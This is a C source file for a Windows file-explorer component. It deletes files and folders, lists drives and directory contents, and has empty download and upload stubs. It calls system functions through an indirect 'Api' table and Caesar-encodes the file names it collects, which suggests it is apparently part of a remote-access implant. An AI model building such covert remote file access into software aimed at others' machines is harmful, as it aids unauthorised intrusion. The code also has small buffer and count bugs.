#include "file_explorer.h"
#include "utils.h"

int delete_file(char* path) {
	return Api.remove(path);
}

int delete_dir(char* path) {
	return Api.rmdir(path);
}

int get_object_info(char* path, struct stat* fileinfo) {
	return Api.stat(path, fileinfo);
}

int get_drives_list(char* buf) {
    DWORD drives = Api.GetLogicalDrives(); // get a bitmask of available drives
    int count = 0; // number of drives found so far

    for (int i = 0; i < MAX_DRIVES; i++) {
        if (drives & (1 << i)) { // check if drive letter is present in bitmask
            buf[count++] = 'A' + i; // add drive letter to buffer
        }
    }

    buf[count++] = '\0'; // add null terminator to buffer

    return count; // return number of drives found
}

char* get_file_list(const char* dirPath, int* numFiles) {
    WIN32_FIND_DATA findData;
    HANDLE hFind;

    WCHAR searchPath[MAX_PATH];
    Api.mbstowcs(searchPath, dirPath, MAX_PATH);

    wcscat(searchPath, L"\\*.*");

    hFind = FindFirstFile(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // Allocate a dynamic array to store the file/folder names
    int maxFiles = BUFFER_SIZE;
    char** fileList = (char**)Api.malloc(maxFiles * sizeof(char*));
    int numFound = 0;

    do {
        // Convert the file/folder name to a char string
        WCHAR wFileName[MAX_PATH];
        wcscpy(wFileName, findData.cFileName);
        char fileName[MAX_PATH];
        Api.wcstombs(fileName, wFileName, MAX_PATH);

        // Ignore the "." and ".." folders
        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
            continue;
        }

        // Add the file/folder name to the array
        if (numFound >= maxFiles) {
            maxFiles *= 2;
            fileList = (char**)Api.realloc(fileList, maxFiles * sizeof(char*));
        }
        fileList[numFound] = (char*)Api.malloc(strlen(fileName) + 1);
        Api.strcpy(fileList[numFound], CAESAR(fileName));
        numFound++;
    } while (FindNextFile(hFind, &findData) != 0);

    Api.FindClose(hFind);

    // Allocate a buffer to store the concatenated file/folder names separated by "/"
    int bufferSize = 0;
    for (int i = 0; i < numFound; i++) {
        bufferSize += strlen(fileList[i]) + 1; // add 1 for the separator
    }
    char* fileNames = (char*)Api.malloc(bufferSize);
    fileNames[0] = '\0';

    // Concatenate the file/folder names separated by "/"
    for (int i = 0; i < numFound; i++) {
        strcat(fileNames, fileList[i]);
        if (i < numFound - 1) {
            strcat(fileNames, "/");
        }
        Api.free(fileList[i]);
    }

    Api.free(fileList);

    // Set the numFiles parameter to the number of files/folders found
    *numFiles = numFound;

    return fileNames;
}


void download_file() {

}

void download_folder() {

}

void upload_file() {

}